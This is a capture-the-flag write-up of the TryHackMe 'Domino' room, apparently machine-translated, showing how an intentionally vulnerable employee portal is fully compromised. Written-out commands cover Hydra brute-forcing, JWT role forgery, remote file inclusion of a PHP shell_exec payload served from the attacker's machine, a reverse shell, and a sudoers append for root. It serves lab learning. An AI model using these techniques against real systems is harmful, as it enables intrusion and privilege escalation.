> *This translation has been made by Claude, check out the original writeup [here](readme.md).*

# Domino

![Screenshot](img/Pasted%20image%2020260601122701.png)

https://tryhackme.com/room/domino
## Introduction

> The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.
>
> As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.
>
> _A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._

![Screenshot](img/Pasted%20image%2020260601122804.png)
## Recon

What does nmap say?

Port 80 and 22 are open.

What does the website look like? Like this:

![Screenshot](img/Pasted%20image%2020260601123346.png)

Forgot password leads to `/forgot.php` and Our Team to `/team.php`. Since the username format is revealed in the form, the team page becomes highly interesting!

![Screenshot](img/Pasted%20image%2020260601123540.png)

Fire up a Hydra with rockyou right away? Nah, let's poke around a bit more first.

This is what `/forgot.php` looks like:

![Screenshot](img/Pasted%20image%2020260601123701.png)

Maybe I can reset a password and figure out what happens in the background?

Here's what it looks like in the frontend if I reset the password for `emma.taylor`, and unfortunately I don't see anything more interesting in Burp.

![Screenshot](img/Pasted%20image%2020260601123915.png)

Fuzzing the endpoints finds, among other things:
- /static/app.js
- /support
- /admin
- /backup
### /static/app.js

![Screenshot](img/Pasted%20image%2020260601124800.png)

A perfect comment about moving all secrets before the website goes to production :D Here we get access to an encryption key that's related to a backup config.
### /backup

![Screenshot](img/Pasted%20image%2020260601124600.png)

In README.txt you can read:

![Screenshot](img/Pasted%20image%2020260601125012.png)

The key we found in `app.js` should be used to decrypt `config.enc`. That's the assumption, at least.

This can be done in the terminal. First we fetch the file with curl:

`curl http://$IP/backup/config.enc -o config.enc`

Next I want to use Openssl to decrypt the file. However, the key needs to be adapted to work with openssl. It needs to be converted to hex, and it needs padding at the end (as mentioned in `app.js`)

The key converted to hex becomes `4e 33 78 75 73 4b 33 79 32 30 32 34 21 21`

Only 14 bytes, so two null bytes at the end makes it correct: `4e 33 78 75 73 4b 33 79 32 30 32 34 21 21 00 00`

The command in openssl becomes the following:

```bash
openssl enc -d -aes-128-ecb \
-in config.enc \
-out config.dec \
-K 4e337875734b33793230323421210000
```

In the decrypted config file there was a small JSON blob:

```json
{
	"app_name":"NexusCorp Portal",
	"version":"2.3.1",
	"deploy_env":"production",
	"system_user":"devops"
}
```

Nice! Could come in handy later.
### /api/auth/token.php

A GET request to the URL redirects to `index.php`. Let's check in Burp, what happens if you send a POST request? Without a body it's the same redirect.

What if we add the whole config as the body?

![Screenshot](img/Pasted%20image%2020260601131138.png)

No revealing response from the API. Might need a valid login from an existing user to be able to talk to the API. I haven't fully broken down and understood the contents of `app.js` yet, so I don't have the full picture of how the process is intended to work.

It feels like we need a valid cookie to talk to the API. And without knowing what this cookie should look like, it becomes a really long shot to sit and guess. So, I can see two possible ways forward:

- Brute force (with Hydra) a login to get a valid token.
- Figure out how the backend works when resetting a password - maybe it resets to a password that follows a certain pattern that's easy to guess.

However, we haven't found any files that reveal how the password reset works, so let's start with Hydra.

Created a list with all usernames. Then:

```bash
hydra -L usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt $IP http-post-form \ 
  "/index.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 20 -f
```

Which resulted in:

![Screenshot](img/Pasted%20image%2020260601153858.png)

After logging in we got a bunch of exciting stuff:

![Screenshot](img/Pasted%20image%2020260601154033.png)

We've also got a slightly more legible cookie now, so we should be able to talk to the API

![Screenshot](img/Pasted%20image%2020260601154136.png)

Oh yes, after navigating to `/api/auth/token.php` I got the following info:

```json
{
	"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODAzMjIwMTEsImV4cCI6MTc4MDMyNTYxMX0.aGehUKO0v1PKZJQsDRJlzXyEWg39fVyWAtCnj9fHmUU",
	"expires_in":3600,
	"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"
	}
```

Time to try talking to `/api/files.php`

Opened Burp, tried to visit `/api/files.php` but needed to add my api-token. I did this with the `Authorization` header and tried again. Then I got a response, but got the following:

![Screenshot](img/Pasted%20image%2020260601154939.png)

Can we forge our JWT? Jump straight to jwt.io

The algorithm used is HS256 - a symmetric variant that uses only *one* secret key for both signing and verification. Can we switch role from user to admin? Let's see.

![Screenshot](img/Pasted%20image%2020260601155807.png)

Nice, we get to talk to the API. Now it wants a name parameter, exactly as it said when we logged in with a valid user. So we're meant to point to a specific filename.

Didn't manage to point to a valid username, but took a quick look at the "My Profile API". Sarah Johnson's ID is 3, but when I changed the ID to 1 I discovered an IDOR vulnerability and the first flag was found:

![Screenshot](img/Pasted%20image%2020260601160717.png)

Since we now had a valid JWT as admin, I tried looking at the endpoint `/admin/` and found another flag!

![Screenshot](img/Pasted%20image%2020260601161607.png)
## /api/files.php

Since question three in the task is about somehow getting RCE on the server, I suspect the reason there's a "file API" is so we can point to a file we've planted ourselves to get us exactly that, RCE. A theory, at least. There's also a function for opening tickets - feels like an obvious path for planting a malicious file? :)

![Screenshot](img/Pasted%20image%2020260601164416.png)

![Screenshot](img/Pasted%20image%2020260601164425.png)

Hm, we can't upload a file. But can we write php straight into the text field?

![Screenshot](img/Pasted%20image%2020260601164643.png)

![Screenshot](img/Pasted%20image%2020260601164659.png)

Hm, no way to click open my ticket again to see if my code executes. Maybe it's possible to write it straight into the subject line, but doubtful. Can I access my ticket via the file API? Took a chance on some names but it feels like a stretch. And nothing executed in the subject line either.

Maybe I need access to the admin user's dashboard. Back to jwt.io

Tried to work some magic with the `nexus_session` cookie we got when logging in with a valid user, but jwt.io fails to decode it properly. Seems to be some custom build.
### Path traversal?

From the question on TryHackMe we learn that the flag should be in `/opt/flag3.txt`, and to search for a file via `/api/files.php` the path must be within `/var/www/html`.

Can start by seeing if we can read out `index.php`, it should exist. And it did!

![Screenshot](img/Pasted%20image%2020260602120309.png)

Here's what `files.php` looks like:

![Screenshot](img/Pasted%20image%2020260602120551.png)

Two interesting things there - one is that they've added protection against path traversal (which I noticed since I failed on a few attempts), and the other is that they've added a deliberate possibility of getting RCE via `eval()`

Testing a one-liner from revshells.com

![Screenshot](img/Pasted%20image%2020260602121320.png)

That didn't work, I should have skipped a step. The following attack chain worked:
- Created a php file locally that runs `shell_exec` and lists the `/opt` directory as follows:

```PHP
<?php echo shell_exec("ls -la /opt 2>&1"); ?>
```

- Start a python server to serve my php file
- Sent a request with the name parameter `name=http://LOCAL-IP:4444/rfi.php`
- Then the directory was listed in the response:

![Screenshot](img/Pasted%20image%2020260602123019.png)

Changed the command to `cat /opt/flag3.txt` instead and got the flag.

Now that we have RCE, why not a reverse shell?

Did the same thing, but with PHP PentestMonkey locally. Got this funny message:

![Screenshot](img/Pasted%20image%2020260602123408.png)

Trying a bunch of different payloads. My shell opens but crashes immediately...

![Screenshot](img/Pasted%20image%2020260602124449.png)

Then the penny dropped!

In my previous attempts I had only been serving the file from my machine while simultaneously waiting for an incoming connection from the server. I actually needed to *both* serve the file (on one port) and start a listener (on another port) for it to work. So I went back to PHP PentestMonkey, started a python server and an nc listener:

![Screenshot](img/Pasted%20image%2020260602150407.png)

Boom, there was the shell!
## Flag 4

Now I have my reverse shell and have upgraded it to be more stable. Question four wants me to find the flag in the home directory of the user `devops`. But `www-data` has no permission to go there...

After some searching on the filesystem we found `config.php` which contained some goodies:

![Screenshot](img/Pasted%20image%2020260602152401.png)

Take a look in the database?

`mysql -u app_user -p -D nexusdb`

Hm, maybe won't find anything super great here:

![Screenshot](img/Pasted%20image%2020260602155222.png)

Same old leftovers I'd found earlier.

But - does `devops` use the same password for the database as for their login? The answer is: yes.

![Screenshot](img/Pasted%20image%2020260602155706.png)

A quick look in the home directory and the fourth flag was secured!
## The Fifth Element. Or flag.

The vulnerable server crashed so I lost my shell. But now I know what password `devops` uses, so it's just a matter of ssh-ing in and picking up from there to escalate to root.

I'm frantically searching the filesystem without finding anything exciting - can't run sudo, no exciting cron jobs, no interesting binaries with the SUID bit set... The only thing I find is a bunch of stuff in `/opt` that's both owned by root and writable.

![Screenshot](img/Pasted%20image%2020260602203240.png)

In the `monitoring` directory there's the script `health_report.sh` which looks like this:

![Screenshot](img/Pasted%20image%2020260602220404.png)

Not only that - it's owned by `root` and belongs to the group `devops`, bingo! Added a small line just to test:

![Screenshot](img/Pasted%20image%2020260602220958.png)

Thought I'd nailed it when I tested this :D

![Screenshot](img/Pasted%20image%2020260602221734.png)

But permission denied...

![Screenshot](img/Pasted%20image%2020260602221759.png)

`bash -c 'echo "$(</root/flag.txt)"'` didn't work either.

If the script had been run as root via a cron job or systemd timer it would have been a trivial matter, but it doesn't...

On closer inspection I see that `health_report.sh` writes a log file to `/var/log/nexus_health.log`. I've looked at that file a couple of times, but now I notice the actual timestamps - they're very frequent.

By running `tail -f /var/log/nexus_health.log` I can see the log file updating in real time - here's my way in to root.

![Screenshot](img/Pasted%20image%2020260603105908.png)

![Screenshot](img/Pasted%20image%2020260603105918.png)

Every minute.

After a lot of back and forth I found this nice page on [geeksforgeeks](https://geeksforgeeks.org/linux-unix/shell-script-to-give-root-privileges-to-a-user). I figured variant 4 would be something for me.

Added `echo "devops ALL=(ALL) ALL" >> /etc/sudoers` at the end of `health_report.sh`. Once the script had run, I checked my sudo permissions with `sudo -l`. Finally `sudo su root` and navigate to `/root` to grab the flag.

![Screenshot](img/Screenshot%20from%202026-06-03%2011-31-43.png)

Wow, what a journey. And what a wall of text. Happy hacking!
